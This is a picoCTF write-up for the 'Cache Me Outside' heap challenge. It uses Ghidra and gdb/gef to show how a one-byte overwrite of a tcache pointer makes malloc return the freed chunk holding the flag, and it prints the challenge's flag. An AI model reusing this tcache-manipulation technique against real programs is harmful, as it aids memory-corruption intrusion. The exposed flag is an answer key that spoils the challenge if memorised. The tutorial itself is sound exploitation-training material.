# Cache Me Outside

## Solution

### Preparing the binary

Running the binary immediately throws a segmentation fault. 

```console
┌──(alex㉿kali)-[~/picoCTF/CacheMeOutside]
└─$ ./heapedit
Segmentation fault
```

This is because our system is incompatible with the provided libc.

We can work around this by using the correct linker. ([pwninit](https://github.com/io12/pwninit) can do this automatically)

```console
┌──(alex㉿kali)-[~/picoCTF/CacheMeOutside]
└─$ pwninit 
bin: ./heapedit
libc: ./libc.so.6
ld: ./ld-2.27.so

copying ./heapedit to ./heapedit_patched
running patchelf on ./heapedit_patched
```

Now running the program will work.

```console
┌──(alex㉿kali)-[~/picoCTF/CacheMeOutside]
└─$ LD_PRELOAD=./libc.so.6 ./ld-2.27.so ./heapedit
You may edit one byte in the program.
Address:
```

We can even use `patchelf` to patch the executable so that it runs normally

```console
┌──(alex㉿kali)-[~/picoCTF/CacheMeOutside]
└─$ patchelf --set-interpreter ./ld-2.27.so heapedit

┌──(alex㉿kali)-[~/picoCTF/CacheMeOutside]
└─$ ./heapedit
You may edit one byte in the program.
Address:
```

### Inspecting the output

Let's start by looking at the source code in Ghidra

```C

undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined local_a9;
  int local_a8;
  int local_a4;
  undefined8 *local_a0;
  undefined8 *local_98;
  FILE *local_90;
  undefined8 *local_88;
  void *local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined local_60;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  local_90 = fopen("flag.txt","r");
  fgets(local_58,0x40,local_90);    // Copies flag into local_58
  local_78 = 0x2073692073696874;
  local_70 = 0x6d6f646e61722061;
  local_68 = 0x2e676e6972747320;
  local_60 = 0;
  local_a0 = (undefined8 *)0x0;
  for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    local_98 = (undefined8 *)malloc(0x80);  // Calls malloc 7 times each with size 0x80
    if (local_a0 == (undefined8 *)0x0) {
      local_a0 = local_98;                  // Assigning the first malloc'd to local_a0
    }
    *local_98 = 0x73746172676e6f43;
    local_98[1] = 0x662072756f592021;
    local_98[2] = 0x203a73692067616c;
    *(undefined *)(local_98 + 3) = 0;
    strcat((char *)local_98,local_58);      // Concat the flag to string local_98
  }
  local_88 = (undefined8 *)malloc(0x80);
  *local_88 = 0x5420217972726f53;
  local_88[1] = 0x276e6f7720736968;
  local_88[2] = 0x7920706c65682074;
  *(undefined4 *)(local_88 + 3) = 0x203a756f;
  *(undefined *)((long)local_88 + 0x1c) = 0;
  strcat((char *)local_88,(char *)&local_78);
  free(local_98);                           // Free the pointer to our flag
  free(local_88);                           // Free another random pointer
  local_a8 = 0;
  local_a9 = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&local_a8);  // Reading an address as an integer
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&local_a9);  // Reading in a string
  *(undefined *)((long)local_a8 + (long)local_a0) = local_a9;   // Changing value in a pointer (from local_a0) to user input
  local_80 = malloc(0x80);                  // Calling malloc again with size 0x80
  puts((char *)((long)local_80 + 0x10));    // Reading value from local_80 with 16 byte  offest
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

From looking at the source code, we can safely deduce that the address taken in is treated as a long, while the value is a string.

```C
puts("You may edit one byte in the program.");
printf("Address: ");
__isoc99_scanf(&DAT_00400b48,&local_a8);  // Reading an address as an integer
printf("Value: ");
__isoc99_scanf(&DAT_00400b53,&local_a9);  // Reading in a string
*(undefined *)((long)local_a8 + (long)local_a0) = local_a9;   // Changing value in a pointer (from local_a0) to user string input
```

What we are interested in is the flag. Let's see where the flag is stored.

```C
// First place of interest.
fgets(local_58,0x40,local_90);            // Stores flag in local_58

// Second place of interest
for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
  local_98 = (undefined8 *)malloc(0x80);  // Calls malloc 7 times each with size 0x80
  if (local_a0 == (undefined8 *)0x0) {
    local_a0 = local_98;                  // Assigning the first malloc'd to local_a0
  }
  *local_98 = 0x73746172676e6f43;
  local_98[1] = 0x662072756f592021;
  local_98[2] = 0x203a73692067616c;
  *(undefined *)(local_98 + 3) = 0;
  strcat((char *)local_98,local_58);      // Concat the flag to string local_98
}
```

From the code regions above, we see that the flag is first stored in local_58, before being appended into local_98. And the local_a0 refers to the first malloc'd local_98.

So let's then check what the program outputs, and from where.

```C
local_80 = malloc(0x80);                  // Calling malloc again with size 0x80
puts((char *)((long)local_80 + 0x10));    // Prints to screen the value stored in local_80 from offset 0x10 onwards
```

Now the code above is interesting. It's directly printing a value from the heap after being assigned (malloc'd). Let's investigate further.

Place a breakpoint before the first free and inspect the heap.

```
gef➤  heap chunks
...Output abbreviated...
    [0x0000000000603800     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     53 6f 72 72 79 21 20 54 68 69 73 20 77 6f 6e 27    Sorry! This won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)  ←  top chunk
```

There's nothing interesting here. So let's place a breakpoint after the first free.

```
gef➤  heap chunks
...Output abbreviated...
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     53 6f 72 72 79 21 20 54 68 69 73 20 77 6f 6e 27    Sorry! This won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)  ←  top chunk
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=1  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) 
```

Then let's place another breakpoint after the second free.

```
gef➤  heap chunks
...Output abbreviated...
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE)  ←  top chunk
gef➤  heap bins tcache
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=2  ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) 
```

We see that the 2 freed chunks are in tcache. And the first chunk refers to "This won't help you" (second freed chunk) and the second chunk contains the flag (first freed chunk).

From observation alone, we know that the tchunks are stored in a LIFO structure.

So what is tcache? Tcache is an optimization built into malloc's memory management. The goal of memory management is to assign blocks of memory for user to use, and to reduce memory fragmentation. Here's a good read [link](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)

Recently freed memory is first inserted into tcache. And if a subsequent malloc call matches (in size), we just return the chunk stored in tcache. Thus speeding up malloc.

Given this information, all we have to do is to make tcache return the chunk that we are interested in. And that would be `*0x603800`. To do that, let's find the reference to the first tcache chunk and clear it. This would cause tcache to return our second chunk `*0x603800` which contains our flag.

```
gef➤  grep 0x603890
[+] Searching '\x90\x38\x60' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602088 - 0x602094  →   "\x90\x38\x60[...]" 
[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000), permission=rw-
  0x7fffffffdab0 - 0x7fffffffdabc  →   "\x90\x38\x60[...]" 
```

We find two results. The result we're interested in should be in the heap (`0x602088`). To overwrite the data, we need to calculate the offset from `local_a0`.

In Ghirda, we see that the position of `local_a0` in the stack is `$rbp-0xa0`
```
       **************************************************************
       *                          FUNCTION                          *
       **************************************************************
                undefined main()
undefined8        Stack[-0xa0]:8 local_a0           XREF[4]:     004008a2(W), 
                                                                 004008ca(R), 
                                                                 004008db(W), 
                                                                 00400a32(R)  
```

Let's check the value stored in position `$rbp-0xa0`

```
gef➤  hexdump byte --size 32 $rbp-0xa0
0x00007fffffffda90     e8 eb ff ff 07 00 00 00 a0 34 60 00 00 00 00 00    .........4`.....
0x00007fffffffdaa0     00 38 60 00 00 00 00 00 60 22 60 00 00 00 00 00    .8`.....`"`.....
gef➤  hexdump byte --size 32 0x07ffffebe8
[!] Command 'hexdump byte' failed to execute properly, reason: Cannot access memory at address 0x7ffffebe8
```

Something doesn't seem right. We expect the value stored in `$rbp-0xa0` to contain a valid address. But the address is unreachable?

Let's disassemble main and see what's going on.

```assembly
// GDB Output
0x0000000000400a32 <+555>:   mov    rax,QWORD PTR [rbp-0x98]      
0x0000000000400a39 <+562>:   add    rdx,rax

// Ghirda Output
00400a32 48 8b 85        MOV        RAX,qword ptr [RBP + local_a0] // local_a0 = -0xa0
         68 ff ff ff
00400a39 48 01 c2        ADD        RDX,RAX
```

Aha. Ghirda and gdb is interpreting it differently. Hence `local_a0` was actually stored in `$rbp-0x98`

```
gef➤  hexdump byte --size 32 $rbp-0x98
0x00007fffffffda98     a0 34 60 00 00 00 00 00 00 38 60 00 00 00 00 00    .4`......8`.....
0x00007fffffffdaa8     60 22 60 00 00 00 00 00 90 38 60 00 00 00 00 00    `"`......8`.....
gef➤  hexdump byte --size 32 0x6034a0
0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f
0x00000000006034b0     6c 61 67 20 69 73 3a 20 70 69 63 6f 43 54 46 7b    lag is: picoCTF{
```

And viola, there lies our flag. Great!. Now let's get the offset from `0x6034a0`. 

```
gef➤  p/d 0x602088 - 0x6034a0
$29 = -5144
```

Sweet. All that's left is to clear the value at that location. Let's set a breakpoint before the assignment of local_a9 and clear the value

```
gef➤  b *0x400a43

// Peek of assembly code at *0x400a43
// Merge lower 8 bits with byte from the address stored in $rdx.
// $rdx -> 0x00602088 -> 0x00603890 -> 0x00603800
//                               ^^ changes are made here
0x400a43 <main+572>       mov    BYTE PTR [rdx], al     

// Set the last 8 bits to value 0. This will change the address from 0x00603890 to 0x00603800.
gef➤  set $al = 0

// Go to next instruction
gef➤  stepi

// Check that 0x602088 refers to 0x603800
gef➤  hexdump byte --size 32 0x602088
0x0000000000602088     00 38 60 00 00 00 00 00 00 00 00 00 00 00 00 00    .8`.............
0x0000000000602098     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
```

Continue execution and the result we get is 

```
lag is: picoCTF{53be92758865dfd2779fa96526dbd0a3}
```

## References

1. [Dvd848 Github](https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Cache_Me_Outside.md)